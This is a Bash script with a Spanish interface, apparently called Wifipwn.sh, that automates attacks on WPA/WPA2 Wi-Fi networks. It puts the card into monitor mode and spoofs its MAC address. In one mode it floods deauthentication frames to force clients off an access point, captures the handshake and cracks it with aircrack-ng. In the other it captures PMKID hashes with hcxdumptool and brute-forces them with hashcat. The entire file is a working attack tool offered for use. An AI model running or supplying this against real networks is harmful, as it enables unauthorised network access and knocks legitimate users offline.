#!/bin/bash

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

#Ctrl+C
trap ctrl_c INT
function ctrl_c() {
	echo -e "\n${redColour}[!]${endColour} ${yellowColour}Saliendo...${endColour}\n"
	tput cnorm; airmon-ng stop ${network_card} > /dev/null 2>&1
	rm Captura* 2>/dev/null ; exit 1
}

function helpPanel() {
	echo -e "\n${yellowColor}[*]${endColour}${grayColour} Uso: ./Wifipwn.sh${endColour}\n"
	echo -e "\t${purpleColour}[-a]${endColour}${yellowColour} Modos de ataque:${endColour}\n"
	echo -e "\t\t${redColour}Handshake${endColour}"
	echo -e "\t\t${redColour}PKMID${endColour}\n"
	echo -e "\t${purpleColour}[-n]${endColour}${yellowColour} Nombre de tarjeta de red${endColour}\n"
	echo -e "\t${purpleColour}[-w]${endColour}${yellowColour} Ruta del diccionario${endColour}"
	tput cnorm; exit 0
}

function dependencies() {
	tput civis
	clear; dependencies=(aircrack-ng macchanger)

	echo -e "\n${blueColour}[+]${endColour}${yellowColour} Comprobando programas necesarios...${endColour}"
	sleep 2

	for program in "${dependencies[@]}"; do
		echo -ne "\n\t${turquoiseColour}[*]${endColour}${grayColour} Herramienta:${endColour}${purpleColour} $program${endColour}${grayColour}... ${endColour}"

		test -f /usr/bin/$program
		if  [ "$(echo $?)" == "0" ];then
			echo -e "${greenColour}(V)${endColour}"
		else
			echo -e "${redColour}(X)${endColour}\n"
			apt install $program -y > /dev/null 2>&1
		fi; sleep 1
	done
}

function startAttack() {

	network_card="${interface_card}"
		clear
		echo -e "\n${blueColour}[+]${endColour}${grayColour} Configurando tarjeta de red...${endColour}\n"
		airmon-ng start ${interface_card} > /dev/null 2>&1
		ifconfig $network_card down && macchanger -a $network_card > /dev/null 2>&1
		ifconfig $network_card up; killall dhclient wpa_supplicant 2>/dev/null

		echo -e "\n${turquoiseColour}[+]${endColour}${grayColour} Nueva direcciÃ³n MAC asignada: ${endColour}${purpleColour}[$(macchanger -s $network_card | grep -i current | xargs | cut -d ' ' -f '3-30')]${endColour}"

	if [ "$(echo $attack_mode)" == "Handshake" ]; then
		xterm -hold -e "airodump-ng $network_card" &
		airodump_xterm_PID=$!
		echo -ne "\n${turquoiseColour}[*]${endColour}${grayColour} Nombre del punto de acceso: ${endColour}" && read apName
		echo -ne "\n${turquoiseColour}[*]${endColour}${grayColour} Canal del punto de acceso: ${endColour}" && read apChannel
		kill -9 $airodump_xterm_PID; wait $airodump_xterm_PID 2>/dev/null

		xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${network_card}" &
		airodump_filter_PID=$!

		sleep 5; xterm -hold -e "aireplay-ng -0 35 -e $apName -c FF:FF:FF:FF:FF:FF ${network_card}" &
		aireplay_xterm_PID=$!
		sleep 30; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null

		sleep 12; kill -9 $airodump_filter_PID; wait $airodump_filter_PID 2>/dev/null

		xterm -hold -e "aircrack-ng -w $wordlist Captura-01.cap" &
	elif [ "$(echo $attack_mode)" == "PKMID" ]; then
		echo -e "\n${yellowColour}[*]${endColour}${blueColour} Iniciando ataque ClientLess PKMID...${endColour}\n"
		sleep 2
		timeout 80 bash -c "hcxdumptool -i ${network_card} --enable_status=1 -o NetworkCap"
		echo -e "\n${blueColor}[+]${endColour}${purpleColour} Extrayendo Hashes...${endColour}\n"
		sleep 2
		hcxpcaptool -z Hashes NetworkCap; rm NetworkCap 2>/dev/null

		test -f Hashes

		if [ "$(echo $?)" == "0" ]; then
			echo -e "\n${turquoiseColor}[+]${endColour}${purpleColour} Iniciando ataque de fuerza bruta...${endColour}\n"
			sleep 2

			hashcat -m 16800 $wordlist Hashes -d 1 --force
		else
			echo -e "${redColour}[X]${endColour}${yellowColour} No se pudo capturar el paquete necesario...${endColour}\n"
			rm NetworkCap* 2>/dev/null
			sleep 2
		fi
	else
		echo -e "${redColour}[X]${endColour}${yellowColour} Este modo de ataque no es vÃ¡lido${endColour}"
	fi
}

#Main Function
if [ "$(id -u)" == "0" ]; then
	declare -i parameter_counter=0;while getopts ":a:n:w:h:" arg; do
		case $arg in
			a) attack_mode=$OPTARG; let parameter_counter+=1 ;;
			n) interface_card=$OPTARG; let parameter_counter+=1;;
			w) wordlist=$OPTARG; let parameter_counter+=1;;
			h) helpPanel;;
		esac
	done

	if [ $parameter_counter -ne 3 ]; then
		helpPanel
	else 
		dependencies
		startAttack
		tput cnorm; airmon-ng stop $network_card > /dev/null 2>&1
	fi
else
	echo -e "\n${redColour}[*] No soy root${endColour}\n"
fi